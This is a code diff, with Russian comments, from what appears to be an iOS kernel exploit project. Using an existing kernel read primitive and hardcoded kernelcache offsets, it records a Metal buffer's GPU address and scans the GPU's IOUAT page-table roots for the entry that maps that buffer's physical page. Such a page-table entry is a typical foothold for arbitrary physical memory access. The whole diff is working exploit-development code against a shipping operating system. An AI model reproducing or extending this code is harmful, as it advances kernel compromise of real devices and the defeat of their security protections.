@@ -5231,6 +5231,7 @@ static void *kpParkWorker(void *arg)
 extern uint64_t kp_rc_kread64(uint64_t);
 
 static void *gBufContents = NULL;
+static uint64_t gBufGPUVA = 0;
 static id gGartBuf = nil; // удерживаем MTLBuffer живым между стадиями
 
 // Дамп pointer-полей объекта: ТОЛЬКО значения, без дереференсов (дереф по
@@ -5320,6 +5321,7 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             if (buf) {
                 memset(buf.contents, 0x42, 0x10000);
                 gBufContents = buf.contents;
+                gBufGPUVA = buf.gpuAddress;
                 gGartBuf = buf;
                 kpNote(r, [NSString stringWithFormat:@"  Metal buf contents=%p gpuAddress=%#llx",
                            buf.contents, (unsigned long long)buf.gpuAddress]);
@@ -5403,37 +5405,54 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             }
         }
 
-        // 6. UAT walk до живого PTE нашего буфера (VA=0x10000018000 →
-        //    half=0, pc=16, pd=0, pt=6). gart+0x288=mux, mux+0x18=UAT user.
-        uint64_t mux = kp_untag_ptr(kp_rc_kread64(gart + 0x288));
-        kpNote(r, [NSString stringWithFormat:@"  mux=%#llx", mux]);
-        if (kpLooksLikeKernelPointer(mux)) {
-            uint64_t kbase2 = kconstant(base);
-            uint64_t slide2 = kbase2 - 0xfffffff007004000;
-            uint8_t legacyFlag = 0;
-            kreadbuf(kbase2 + 0xab73fb8 - 0xfffffff007004000, &legacyFlag, 1);
-            uint64_t u18 = kp_untag_ptr(kp_rc_kread64(mux + 0x18));
-            uint64_t u10 = kp_untag_ptr(kp_rc_kread64(mux + 0x10));
-            kpNote(r, [NSString stringWithFormat:@"  legacyFlag=%u mux+0x18=%#llx mux+0x10=%#llx", legacyFlag, u18, u10]);
-            // mux дамп целиком (0x20)
-            for (uint32_t o = 0; o < 0x20; o += 8)
-                kpNote(r, [NSString stringWithFormat:@"    mux+%#x = %#llx", o, kp_rc_kread64(mux + o)]);
-            // выбираем ненулевой
-            uint64_t uat = u18 ? u18 : u10;
-            if (!uat && legacyFlag) uat = u10;
-        if (kpLooksLikeKernelPointer(uat)) {
-            uint64_t L1 = kp_untag_ptr(kp_rc_kread64(uat + 0x28 + 0x08));
-            uint64_t L1e = kp_untag_ptr(kp_rc_kread64(L1 + 16 * 8));
-            uint64_t L2arr = kp_untag_ptr(kp_rc_kread64(uat + 0x28 + 0x18));
-            uint64_t L2base = kp_untag_ptr(kp_rc_kread64(L2arr + 16 * 8));
-            uint64_t L2e = kp_untag_ptr(kp_rc_kread64(L2base + 0));
-            uint64_t L3pp = kp_untag_ptr(kp_rc_kread64(uat + 0x28 + 0x30));
-            uint64_t L3arr = kp_untag_ptr(kp_rc_kread64(L3pp + 16 * 8));
-            uint64_t L3base = kp_untag_ptr(kp_rc_kread64(L3arr + 0));
-            uint64_t pte = kp_rc_kread64(L3base + 6 * 8);
-            kpNote(r, [NSString stringWithFormat:@"  walk: L1=%#llx L1[16]=%#llx L2arr=%#llx L2=%#llx L2[0]=%#llx L3pp=%#llx L3arr=%#llx L3base=%#llx",
-                       L1, L1e, L2arr, L2base, L2e, L3pp, L3arr, L3base]);
-            kpNote(r, [NSString stringWithFormat:@"  PTE нашего буфера [pt=6] = %#llx (ждём phys окно с PA=%#llx)", pte, pa0]);
+        // 6. IOUAT: корни таблиц в глобале 0xaad63e0; pd=VA[35:25], pt=VA[24:14].
+        //    Дерефы только в heap-полосе 0xffffffdf… и kernelcache — иначе
+        //    аппаратный ресет без паники (проверено больно).
+        uint64_t kbase2 = kconstant(base);
+        uint64_t slide2 = kbase2 - 0xfffffff007004000;
+        uint64_t idxVal = 0; kreadbuf(kbase2 + (0xaa2c418 - 0xfffffff007004000), &idxVal, 8);
+        uint8_t shiftByte = 0; kreadbuf(kbase2 + (0xaa2c410 - 0xfffffff007004000), &shiftByte, 1);
+        uint64_t gpuVA = gBufGPUVA;
+        kpNote(r, [NSString stringWithFormat:@"  IOUAT: idxGlobal=%#llx shiftByte=%u gpuVA=%#llx", idxVal, shiftByte, gpuVA]);
+        uint64_t roots = kbase2 + (0xaad63e0 - 0xfffffff007004000);
+        NSMutableString *rl = [NSMutableString stringWithString:@"  roots:"];
+        for (int i = 0; i < 32; i++) {
+            uint64_t rv = kp_untag_ptr(kp_rc_kread64(roots + i * 8));
+            [rl appendFormat:@" [%d]=%#llx", i, rv];
+        }
+        kpNote(r, rl);
+        // наш root: idx = gpuVA >> 36
+        uint32_t ridx = (uint32_t)(gpuVA >> 36);
+        uint64_t root = kp_untag_ptr(kp_rc_kread64(roots + (uint64_t)ridx * 8));
+        kpNote(r, [NSString stringWithFormat:@"  root[%u]=%#llx", ridx, root]);
+        if (kpLooksLikeKernelPointer(root)) {
+            // дамп root-структуры + follow указателей (2 уровня), скан на pa0
+            uint64_t visited[64]; int nv = 0;
+            uint64_t queue[64]; int nq = 0;
+            queue[nq++] = root;
+            for (int depth = 0; depth < 3 && nq; depth++) {
+                int lvl = nq; nq = 0;
+                for (int q = 0; q < lvl; q++) {
+                    uint64_t obj = queue[q];
+                    BOOL dup = NO;
+                    for (int v = 0; v < nv; v++) if (visited[v] == obj) { dup = YES; break; }
+                    if (dup) continue;
+                    visited[nv++] = obj;
+                    NSMutableString *dl = [NSMutableString stringWithFormat:@"  L%d obj %#llx:", depth, obj];
+                    for (uint32_t o = 0; o < 0x400; o += 8) {
+                        uint64_t e = kp_rc_kread64(obj + o);
+                        BOOL hitRaw = ((e & 0xFFFFFFFFC000ULL) == (pa0 & 0xFFFFFFFFC000ULL)) && (e & ~0x3fffULL) && pa0;
+                        if (hitRaw) [dl appendFormat:@" +%#x=%#llx←PTE!", o, e];
+                        uint64_t eu = kp_untag_ptr(e);
+                        if (kpLooksLikeKernelPointer(eu) && nq < 60 &&
+                            ((eu >> 40) == 0xffffffdfULL >> 32 || (eu >> 40) == 0xffffffe0ULL >> 32 || (eu >> 40) == 0xffffffe1ULL >> 32 ||
+                             (eu >= slide2 + 0xfffffff007004000 && eu < slide2 + 0xfffffff007004000 + 0x4000000))) {
+                            queue[nq++] = eu;
+                        }
+                    }
+                    kpNote(r, dl);
+                }
+            }
         }
     }
     }
